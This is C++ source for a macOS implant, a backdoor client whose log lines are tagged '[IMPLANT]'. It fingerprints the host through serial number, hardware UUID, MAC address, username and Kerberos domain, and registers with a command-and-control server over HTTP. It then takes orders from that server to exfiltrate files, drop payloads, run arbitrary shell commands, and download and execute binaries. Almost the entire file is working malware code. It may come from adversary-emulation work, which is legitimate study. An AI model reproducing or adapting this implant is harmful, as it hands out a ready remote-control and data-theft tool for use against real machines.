#include "ClientPP.hpp"

namespace client {
    const int RESP_BUFFER_SIZE = 65535;
    const std::string DOWNLOAD_FILE_NAME = "osx.download";

    std::string executeCmd(std::string cmd) {
        FILE *fp;
        std::string output = "";
        char line[2048];

        fp = popen(cmd.c_str(), "r");
        if (fp == NULL) {
            std::cout << "[IMPLANT] Failed to run command" << std::endl;
        }

        while (fgets(line, sizeof(line), fp) != NULL) {
            output = output + line;
        }

        pclose(fp);

        if (output == "") {
            std::cout << "[IMPLANT] Output is empty for cmd: " + cmd << std::endl;
        }

        return output;
    }

    std::string getPlatformExpertDeviceValue(std::string key) {
        CFStringRef value_ref;
        char buffer[64] = {0};
        std::string ret("");
        io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                            IOServiceMatching("IOPlatformExpertDevice"));
        CFStringRef key_cfstring = CFStringCreateWithCString(kCFAllocatorDefault, key.c_str(), kCFStringEncodingUTF8);
        if (platformExpert)
        {
            CFTypeRef value_cfstring = IORegistryEntryCreateCFProperty(platformExpert,
                                                                        key_cfstring,
                                                                        kCFAllocatorDefault, 0);
            if (value_cfstring) {
                value_ref = (CFStringRef)value_cfstring;
            }
            if (CFStringGetCString(value_ref, buffer, 64, kCFStringEncodingUTF8)) {
                ret = buffer;
            }

            IOObjectRelease(platformExpert);
        }
        return ret;
    }

    bool downloadFile(std::vector<unsigned char> payload, std::string path) {
        std::ofstream out_file(path + "/" + client::DOWNLOAD_FILE_NAME, std::ios::out);

        if (!out_file) {
            std::cout << "[IMPLANT] File not created" << std::endl;
            return false;
        }
        else {
            copy(payload.begin(), payload.end(), std::ostreambuf_iterator<char>(out_file));
            return true;
        }
    }

    std::vector<unsigned char> uploadFile(std::string path) {
        std::ifstream in_file(path);

        if (!in_file) {
            std::cout << "[IMPLANT] File could not be opened for reading" << std::endl;
            return std::vector<unsigned char>();
        }
        else {
            std::stringstream in_stream;
            in_stream << in_file.rdbuf();
            const std::string& in_str = in_stream.str();
            return std::vector<unsigned char>(in_str.begin(), in_str.end());
        }

    }

    int getFileSize(std::string path) {
        struct stat stat_buf;
        int rc = stat(path.c_str(), &stat_buf);
        if (rc == 0) {
            return static_cast<int>(stat_buf.st_size);
        } else {
            return -1;
        }
    }
}

bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
    bool completed_discovery = false;
    // if parameters are populated, just return true
    if (c->strClientID != "") {
        std::cout << "[IMPLANT] Client ID already populated as: " + c->strClientID << std::endl;
        return true;
    }

    // otherwise, perform discovery actions, send to C2 server, return true
    else {
        std::string os_info = "";

        ClientPP::createClientID(c);
        os_info += c->strClientID + "\n";
        os_info += c->pathProcess + "\n";

        // get system time to populate install time
        std::chrono::system_clock::time_point tp = std::chrono::system_clock::now();
        std::chrono::system_clock::duration duration = tp.time_since_epoch();
        c->installTime = duration.count() * std::chrono::system_clock::period::num / std::chrono::system_clock::period::den;
        os_info += std::to_string(c->installTime) + "\n";

        // getpwuid() -> pw_name
        struct passwd *pwd;
        std::string username;
        if ((pwd = getpwuid(geteuid())) != NULL)
            username = pwd->pw_name;
        os_info += username + "\n";

        // scutil --get ComputerName
        os_info += client::executeCmd("scutil --get ComputerName");

        // uname -m
        os_info += client::executeCmd("uname -m");

        // get domain name
        c->domain = client::executeCmd("klist 2>/dev/null | awk '/Principal/ {split($0,line,\"@\"); printf(\"%s\", line[2])}'");
        os_info += c->domain;

        // sw_vers
        os_info += client::executeCmd("sw_vers -productVersion");

        // system_profiler SPHardwareDataType 2>/dev/null | awk ...
        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor / {split($0,line,\": \"); printf(\"%s\",line[2]);}'") + "\n";
        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";
        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor Name/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";

        // send POST request with data to C2
        unsigned char registration[] = {0x21, 0x70, 0x27, 0x20};
        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), registration, "");

        completed_discovery = true;
        
        std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
    }

    return completed_discovery;
}

void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
    // heartbeat - send HTTP GET request to server
    std::string heartbeat = c->strClientID;
    std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
    unsigned char heartbeat_instruction[] = {0x55, 0x00, 0x00, 0x00};
    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector, heartbeat_instruction, c->strClientID);

    if (response_vector.size() == 0) {
        std::cout << "[IMPLANT] No response returned from communication library" << std::endl;
    }
    else {
        Communication packet = Communication(response_vector);

        // just for debugging ******
        std::cout << "[IMPLANT] Response buffer contains: \n";

        std::cout << "  Key: ";
        std::vector<unsigned char> key = Communication::getKey(packet);
        std::string key_str(key.begin(), key.end());
        std::cout << key_str << std::endl;

        std::cout << "  Payload: ";
        std::vector<unsigned char> payload = Communication::getPayload(packet);
        std::string payload_str(payload.begin(), payload.end());
        std::cout << payload_str << std::endl;

        std::cout << "  Instruction: ";
        printf("%.2X", Communication::getInstruction(packet));
        std::cout << std::endl;
        // just for debugging ******

        unsigned char dwCommand = Communication::getInstruction(packet);

        // receive and extract instruction
        if (dwCommand == 0x55) {
            // no tasks available
            std::cout << "[IMPLANT] Recieved empty response/heartbeat instruction" << std::endl;
        }
        else if (dwCommand == 0x72) {
            // upload file
            std::cout << "[IMPLANT] Received upload file instruction" << std::endl;
            std::vector<unsigned char> path = Communication::getPayload(packet);
            std::string path_str(path.begin(), path.end());
            std::vector<unsigned char> upload_file = client::uploadFile(path_str);
            if (upload_file.size() == 0) {
                std::cout << "[IMPLANT] Read file for upload failed" << std::endl;
            }
            else {
                unsigned char upload_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", upload_file, upload_instruction, c->strClientID);
            }
        }
        else if (dwCommand == 0x23 || dwCommand == 0x3C ) {
            // download file
            std::cout << "[IMPLANT] Received download file instruction" << std::endl;
            std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
            bool success = client::downloadFile(fileBytes, c->pathProcess);
            if (!success) {
                std::cout << "[IMPLANT] Write file for download failed" << std::endl;
            }
        }
        else if (dwCommand == 0xAC) {
            // run command in terminal
            std::cout << "[IMPLANT] Received run command in terminal instruction" << std::endl;
            std::vector<unsigned char> command = Communication::getPayload(packet);
            std::string command_str(payload.begin(), payload.end());
            std::string output = client::executeCmd(command_str);

            // encrypt output

            // return output - send HTTP POST request to server
            unsigned char execute_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), execute_instruction, c->strClientID);
        }
        else if (dwCommand == 0xA2) {
            // download file and execute
            std::cout << "[IMPLANT] Received download and execute file instruction" << std::endl;
            std::vector<unsigned char> fileBytes = Communication::getPayload(packet);
            bool success = client::downloadFile(fileBytes, c->pathProcess);
            if (!success) {
                std::cout << "[IMPLANT] Download failed" << std::endl;
            }
            else {
                unsigned char download_exec_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
                std::string output_path = c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME;
                std::string output = client::executeCmd("chmod 755 " + output_path + "; " + output_path);
                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), download_exec_instruction, c->strClientID);
            }
        }
        else if (dwCommand == 0x07) {
            // get config info
            std::cout << "[IMPLANT] Received get config info instruction" << std::endl;
            unsigned char get_config_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
            std::string config_info = "Config Info:\nID: " + c->strClientID + "\nPath: " + c->pathProcess + "\nInstall Time: " + std::to_string(c->installTime);
            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(config_info.begin(), config_info.end()), get_config_instruction, c->strClientID);
        }
        else if (dwCommand == 0x33) {
            // get a file size
            std::cout << "[IMPLANT] Received get file size instruction" << std::endl;
            unsigned char get_filesize_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
            std::vector<unsigned char> path = Communication::getPayload(packet);
            std::string path_str(path.begin(), path.end());
            int file_size = client::getFileSize(path_str);
            std::string file_size_str = "Size of " + std::string(path.begin(), path.end()) + ": " + std::to_string(file_size) + " bytes";
            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(file_size_str.begin(), file_size_str.end()), get_filesize_instruction, c->strClientID);
        }
        else if (dwCommand == 0xe8) {
            // exit
            std::cout << "[IMPLANT] Received exit instruction" << std::endl;
            exit(0);
        }
        else {
            std::cout << "[IMPLANT] Received unfamiliar instruction" << std::endl;
        }
    }

    // sleep after execution
    std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
}

void ClientPP::createClientID(ClientPP * c) {
    //  serial number - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ {split ($0, line, "\""); printf("%s", line[4]); }'
    std::string serial_number = client::getPlatformExpertDeviceValue("IOPlatformSerialNumber");

    //  hardware UUID - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {split ($0, line, "\""); printf("%s", line[4]); }'
    std::string platform_uuid = client::getPlatformExpertDeviceValue("IOPlatformUUID");

    //  mac address - ifconfig en0 | awk '/ether/{print $2}'
    std::string mac_address = client::executeCmd("ifconfig en0 | awk '/ether/{print $2}'");
    mac_address = mac_address.substr(0, mac_address.size()-1);

    //  randomly generated UUID - uuidgen
    std::string random_uuid = client::executeCmd("uuidgen");
    random_uuid = random_uuid.substr(0, random_uuid.size() -1 );
    std::cout << "[IMPLANT] uuidgen returned: " + random_uuid << std::endl;

    std::string cmd = "echo " + serial_number + platform_uuid + mac_address + random_uuid + " | md5 | xxd -r -p | base64";

    std::string id_str = client::executeCmd(cmd);
    id_str = id_str.substr(0, id_str.size()-1);
    std::vector<unsigned char> id_vector(id_str.begin(), id_str.end());

    memcpy(c->clientID, &id_vector[0], sizeof(id_vector));
    c->strClientID = id_str;
}

std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction, std::string clientID) {
    // set response_buffer and response_length to hold the HTTP response and size
    unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
    unsigned char* response_buffer_ptr = &response_buffer[0];
    int response_length = 0;
    int* response_length_ptr = &response_length;
    
    // loads CommsLib exported function that generates the HTTP request
    void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instr, const char * clientID) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**, unsigned char **, const char *))dlsym(dylib, "sendRequest");
    if (sendRequest == NULL) {
        std::cout << "[IMPLANT] unable to load libComms.dylib sendRequest" << std::endl;
        dlclose(dylib);
        return std::vector<unsigned char>();
    }

    // call CommsLib sendRequest and pass the pointers to the response_buffer and response_length for updating
    sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr, &instruction, clientID.c_str());

    return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
}

ClientPP::~ClientPP() {
    dlclose(dylib);
}
